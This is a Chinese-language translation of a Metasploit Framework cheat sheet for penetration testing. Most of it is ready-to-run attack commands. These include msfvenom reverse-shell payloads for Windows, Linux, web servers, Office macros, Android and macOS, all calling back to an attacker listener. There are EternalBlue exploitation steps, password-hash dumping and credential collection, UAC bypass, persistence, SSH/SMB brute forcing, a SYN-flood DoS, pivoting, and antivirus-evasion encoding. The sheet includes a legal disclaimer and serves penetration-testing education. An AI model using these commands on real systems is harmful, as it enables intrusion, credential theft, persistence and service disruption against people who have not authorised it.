# 🔴 Metasploit Framework 完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![许可证](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **全球广泛使用的渗透测试框架** - 全面掌握 Metasploit 的参考指南

---

## 📋 目录

- [简介](#-introduction)
- [安装](#-installation)
- [架构概览](#-architecture-overview)
- [启动 Metasploit](#-starting-metasploit)
- [基本命令](#-basic-commands)
- [模块类型](#-module-types)
- [漏洞利用流程](#-exploitation-workflow)
- [数据库集成](#-database-integration)
- [扫描与枚举](#-scanning--enumeration)
- [载荷生成（msfvenom）](#-payload-generation-msfvenom)
- [后渗透](#-post-exploitation)
- [辅助模块](#-auxiliary-modules)
- [实际场景示例](#-real-world-examples)
- [快速参考表](#-quick-reference-tables)
- [使用技巧与最佳实践](#-tips--best-practices)
- [资源](#-resources)

---

<a id="-introduction"></a>
## 🎯 简介

**Metasploit Framework** 是开源的渗透测试与漏洞利用开发平台，提供以下功能：

- 🔍 **信息收集** 与漏洞扫描
- 💉 **漏洞利用开发** 与投递
- 🎭 **载荷生成** 适用于多种平台
- 🔐 **后渗透** 工具与技术
- 📊 **Reporting** 与文档编制功能

### 主要组件

| 组件 | 说明 |
|-----------|-------------|
| `msfconsole` | 主要命令行界面 |
| `msfvenom` | 载荷生成器与编码器 |
| `msfdb` | 数据库管理工具 |
| `msfrpcd` | 用于远程访问的 RPC 守护进程 |

---

<a id="-installation"></a>
## 📥 安装

### Kali Linux（预安装）
```bash
# 更新 Metasploit
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# 安装依赖
sudo apt install curl gnupg2 software-properties-common

# 添加 Metasploit 软件源
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows（原文不建议用于生产环境）
```powershell
# 从以下地址下载安装程序： https://windows.metasploit.com/
# 运行安装程序并按提示操作
```

---

<a id="-architecture-overview"></a>
## 🏗️ 架构概览

> **译注：** 图中的模块数量是原文的近似示例，并非当前版本统计。这里的代码块混用系统终端、msfconsole 和 Meterpreter 语法；`msf6 >` 等是控制台提示符。各模块路径、选项、载荷格式及操作系统适用范围需与实际版本核对。

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ 漏洞利用 │  │ 载荷     │  │辅助模块  │  │  后渗透  │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ 编码器   │  │   NOPS   │  │ 规避     │  │ 插件     │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                      接口                                    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 数据库（PostgreSQL）                         │
└─────────────────────────────────────────────────────────────┘
```

### 目录结构
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # 漏洞利用模块
│   ├── payloads/      # 载荷模块
│   ├── auxiliary/     # 扫描、模糊测试等
│   ├── post/          # 后渗透
│   ├── encoders/      # 载荷编码器
│   ├── nops/          # NOP 生成器
│   └── evasion/       # 杀毒软件规避模块
├── tools/             # 附加工具
├── scripts/           # Meterpreter 脚本
├── data/              # 字典、模板
└── plugins/           # 控制台插件
```

---

<a id="-starting-metasploit"></a>
## 🚀 启动 Metasploit

### 初始化数据库（首次使用）
```bash
# 启动 PostgreSQL 服务
sudo systemctl start postgresql

# 初始化数据库
sudo msfdb init

# 检查数据库状态
sudo msfdb status
```

### 启动 msfconsole
```bash
# 常规启动
msfconsole

# 安静模式（不显示横幅）
msfconsole -q

# 启动时执行命令
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# 加载资源脚本文件
msfconsole -r commands.rc
```

---

<a id="-basic-commands"></a>
## ⌨️ 基本命令

### 导航与帮助

| 命令 | 说明 |
|---------|-------------|
| `help` or `?` | 显示帮助菜单 |
| `help <command>` | 查看指定命令的帮助 |
| `search <term>` | 按名称、CVE 或平台搜索模块 |
| `use <module>` | 选择模块 |
| `back` | 退出当前模块 |
| `info` | 显示模块信息 |
| `show options` | 显示模块选项 |
| `show advanced` | 显示高级选项 |
| `show payloads` | 列出兼容载荷 |
| `show targets` | 列出可用目标 |

### 模块配置

```bash
# 设置选项
set RHOSTS 192.168.1.100          # 目标 IP
set RPORT 445                      # 目标端口
set LHOST 192.168.1.50            # 本地 IP（攻击机）
set LPORT 4444                     # 本地端口（监听器）
set PAYLOAD windows/meterpreter/reverse_tcp

# 设置全局选项（在模块间保留）
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# 取消选项设置
unset RHOSTS
unsetg LHOST

# 检查当前设置
show options
check                              # 检查目标是否存在漏洞
```

### 执行

```bash
# 运行漏洞利用
exploit
run

# 在后台运行
exploit -j

# 使用指定选项运行
exploit -z                         # 成功后不自动进入会话交互
```

### 会话管理

```bash
# 列出会话
sessions
sessions -l

# 与会话交互
sessions -i 1

# 终止会话
sessions -k 1

# 终止所有会话
sessions -K

# 将 Shell 升级为 Meterpreter
sessions -u 1

# 在所有会话执行命令
sessions -c "sysinfo"
```

---

<a id="-module-types"></a>
## 📦 模块类型

### 1. 漏洞利用模块（Exploits）
用于利用漏洞的模块。

```bash
# 搜索漏洞利用模块
search type:exploit platform:windows

# 示例
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. 载荷（Payloads）
漏洞利用成功后执行的代码。

**类型：**
- **Singles** - 独立完整的载荷
- **Stagers** - 建立攻击机与目标之间的连接
- **Stages** - 由 Stager 下载的后续阶段（例如 Meterpreter）

```bash
# 列出载荷
show payloads

# 载荷命名约定
<platform>/<arch>/<type>/<connection>
# 示例: windows/x64/meterpreter/reverse_tcp
```

### 3. 辅助模块（Auxiliary）
扫描、模糊测试、嗅探等。

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
后渗透模块。

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. 编码器（Encoders）

> **译注（编码器）：** 编码主要用于处理坏字符等载荷约束，不能据此保证绕过杀毒软件或 EDR；多次编码与使用自定义模板也不构成可靠的免杀方案。参见 [Rapid7 的 msfvenom 官方说明](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)。
对载荷进行编码，原文将其用于规避检测；适用限制见译注。

```bash
show encoders
# 示例: x86/shikata_ga_nai
```

---

<a id="-exploitation-workflow"></a>
## 🎯 漏洞利用流程

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   侦察与     │───▶│    选择      │───▶│  配置        │
│  枚举        │    │    模块      │    │   选项       │
└──────────────┘    └──────────────┘    └──────────────┘
                                               │
                                               ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    后        │◀───│   利用       │◀───│    检查      │
│ 渗透         │    │    目标      │    │    目标      │
└──────────────┘    └──────────────┘    └──────────────┘
```

### 分步示例

```bash
# 1. 搜索漏洞利用模块
msf6 > search eternalblue

# 2. 选择模块
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. 查看选项
msf6 exploit(ms17_010_eternalblue) > show options

# 4. 设置目标
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. 设置载荷
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. 设置监听器
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. 检查漏洞（可选）
msf6 exploit(ms17_010_eternalblue) > check

# 8. 执行
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a id="-database-integration"></a>
## 🗄️ 数据库集成

### 准备与连接

```bash
# 初始化数据库
msfdb init

# 连接数据库
db_connect msf:password@127.0.0.1/msf

# 检查状态
db_status

# 断开连接
db_disconnect
```

### 工作区管理

```bash
# 列出工作区
workspace

# 创建工作区
workspace -a pentest_project

# 切换工作区
workspace pentest_project

# 删除工作区
workspace -d old_project

# 重命名工作区
workspace -r old_name new_name
```

### 主机管理

```bash
# 列出主机
hosts

# 手动添加主机
hosts -a 192.168.1.100

# 删除主机
hosts -d 192.168.1.100

# 搜索主机
hosts -S windows

# 导出主机
hosts -o /tmp/hosts.csv
```

### 服务管理

```bash
# 列出服务
services

# 按端口过滤
services -p 80,443

# 按服务名称过滤
services -s http

# 搜索服务
services -S microsoft
```

### 漏洞管理

```bash
# 列出漏洞
vulns

# 添加漏洞
vulns -a 192.168.1.100 -n "MS17-010"
```

### 导入与导出

```bash
# 导入 Nmap 扫描结果
db_import /path/to/nmap_scan.xml

# 导入 Nessus 扫描结果
db_import /path/to/nessus_scan.nessus

# 直接运行 Nmap
db_nmap -sV -O 192.168.1.0/24

# 导出数据
hosts -o hosts.csv
services -o services.csv
```

---

<a id="-scanning--enumeration"></a>
## 🔍 扫描与枚举

### 端口扫描

```bash
# TCP SYN 扫描
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# TCP connect 扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### 服务枚举

```bash
# SMB 枚举
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB 共享
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# SSH 版本
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP 版本
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP 枚举
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### 漏洞扫描

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# HTTP 漏洞扫描器
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

<a id="-payload-generation-msfvenom"></a>
## 💉 载荷生成（msfvenom）

### 基本语法
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `-p` | 使用的载荷 |
| `-f` | 输出格式 |
| `-o` | 输出文件 |
| `-e` | 使用的编码器 |
| `-i` | 编码迭代次数 |
| `-b` | 需要避开的坏字符 |
| `-n` | NOP 滑梯长度 |
| `--platform` | 目标平台 |
| `-a` | 体系结构 |
| `LHOST` | 监听器 IP |
| `LPORT` | 监听器端口 |

### Windows 载荷

```bash
# 反向 TCP（Meterpreter）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# 反向 TCP（x64）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# 反向 HTTPS（加密）
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# 绑定 TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# 使用编码（原文用于规避杀毒检测）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Linux 载荷

```bash
# 反向 TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# 反向 TCP（x64）
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# 绑定 Shell
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Web 载荷

```bash
# PHP 反向 Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASP 反向 Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# ASPX 反向 Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# JSP 反向 Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR 文件
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### 脚本载荷

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA（宏）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Android 载荷

```bash
# Android 反向 TCP
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### macOS 载荷

```bash
# macOS 反向 TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Multi/Handler 配置

```bash
# 启动监听器
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

<a id="-post-exploitation"></a>
## 🔓 后渗透

### 基本后渗透模块

```bash
# 获取系统信息
use post/windows/gather/enum_system

# 获取已登录用户
use post/windows/gather/enum_logged_on_users

# 导出密码哈希
use post/windows/gather/hashdump

# 从内存提取凭据
use post/windows/gather/credentials/credential_collector

# 检查虚拟机环境
use post/windows/gather/checkvm
```

### 权限提升

```bash
# Windows 提权建议工具
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC 绕过
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# 获取 SYSTEM 权限
use post/windows/escalate/getsystem
```

### 持久化

```bash
# 注册表持久化
use exploit/windows/local/persistence_service
set SESSION 1
run

# 计划任务持久化
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

<a id="-auxiliary-modules"></a>
## 🔧 辅助模块

### 暴力破解

```bash
# SSH 暴力破解
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SMB 暴力破解
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# FTP 暴力破解
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 嗅探

```bash
# HTTP 密码嗅探器
use auxiliary/sniffer/psnuffle
run

# 捕获数据包
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS（仅用于测试）

```bash
# SYN 洪泛
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

<a id="-real-world-examples"></a>
## 🎬 实际场景示例

### 示例 1：EternalBlue 攻击（MS17-010）

```bash
# 启动 Metasploit
msfconsole -q

# 搜索漏洞利用模块
search eternalblue

# 使用漏洞利用模块
use exploit/windows/smb/ms17_010_eternalblue

# 配置
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# 检查是否存在漏洞
check

# 利用漏洞
exploit
```

### 示例 2：Web 应用攻击

```bash
# 扫描漏洞
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# 利用文件上传
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### 示例 3：配合 msfvenom 使用 Multi-Handler

```bash
# 终端 1：生成载荷
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# 终端 2：启动处理器
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# 将 payload.exe 传到目标并执行
# 会话将连接到处理器
```

### 示例 4：通过已入侵主机建立跳板

```bash
# 获得 Meterpreter 会话后
meterpreter > run autoroute -s 10.10.10.0/24

# 或从 msfconsole 操作
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# 现在扫描内部网络
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

<a id="-quick-reference-tables"></a>
## 📊 快速参考表

### 核心命令

| 命令 | 说明 |
|---------|-------------|
| `search <term>` | 搜索模块 |
| `use <module>` | 选择模块 |
| `show options` | 显示选项 |
| `set <opt> <val>` | 设置选项值 |
| `exploit` / `run` | 执行模块 |
| `back` | 返回主界面 |
| `sessions -l` | 列出会话 |
| `sessions -i <id>` | 与会话交互 |

### 常用载荷

| 载荷 | 说明 |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter（32 位） |
| `windows/x64/meterpreter/reverse_tcp` | Windows Meterpreter（64 位） |
| `windows/meterpreter/reverse_https` | 加密连接 |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java/JSP Shell |
| `android/meterpreter/reverse_tcp` | Android Meterpreter |

### 输出格式（msfvenom）

| 格式 | 扩展名 | 使用场景 |
|--------|-----------|----------|
| `exe` | .exe | Windows 可执行文件 |
| `elf` | （无） | Linux 可执行文件 |
| `macho` | （无） | macOS 可执行文件 |
| `raw` | 不固定 | 原始 Shellcode |
| `asp` | .asp | IIS Web 服务器 |
| `aspx` | .aspx | .NET Web 服务器 |
| `php` | .php | PHP Web 服务器 |
| `jsp` | .jsp | Java Web 服务器 |
| `war` | .war | Tomcat 部署 |
| `psh` | .ps1 | PowerShell 脚本 |
| `vba` | .vba | Office 宏 |
| `dll` | .dll | Windows 库 |

### 常用编码器

| 编码器 | 说明 |
|---------|-------------|
| `x86/shikata_ga_nai` | 多态 XOR 编码器 |
| `x64/xor` | XOR 编码器（64 位） |
| `x86/alpha_mixed` | 字母数字编码器 |
| `php/base64` | Base64 PHP 编码器 |

---

<a id="-tips--best-practices"></a>
## 💡 使用技巧与最佳实践

### ⚠️ 法律免责声明
> **重要提示：** 仅针对您拥有或已获得明确书面授权的系统使用 Metasploit。未经授权访问计算机系统属于违法行为。

### 性能建议

1. **使用数据库**
   ```bash
   # 始终初始化并使用数据库
   msfdb init
   db_status
   ```

2. **使用工作区**
   ```bash
   workspace -a client_pentest
   ```

3. **资源脚本**
   ```bash
   # 将命令保存到 .rc 文件
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # 运行脚本
   msfconsole -r handler.rc
   ```

4. **合理使用线程**
   ```bash
   set THREADS 10  # 避免使目标过载
   ```

### 规避技术

1. **多次编码**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **自定义模板**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **使用 HTTPS 载荷**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### 故障排查

| 问题 | 解决方法 |
|-------|----------|
| 数据库无法连接 | `msfdb reinit` |
| 模块无法加载 | `reload_all` |
| 会话立即断开 | 检查杀毒软件，并尝试编码载荷 |
| 漏洞利用失败 | 检查目标操作系统版本，并尝试其他目标类型 |

---

<a id="-resources"></a>
## 📚 资源

### 官方文档
- [Metasploit 文档](https://docs.metasploit.com/)
- [Rapid7 博客](https://www.rapid7.com/blog/)
- [Metasploit GitHub 仓库](https://github.com/rapid7/metasploit-framework)

### 学习资源
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### 速查表
- [SANS Metasploit 速查表](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter 速查表](./Meterpreter.zh-CN.md)

---

## 📄 许可证

本速查表仅用于教育学习。请以负责任且合乎道德的方式使用。

---

<p align="center">
  <b>祝学习与测试顺利！ 🔴</b><br>
  <i>请记住：能力越大，责任越大</i>
</p>
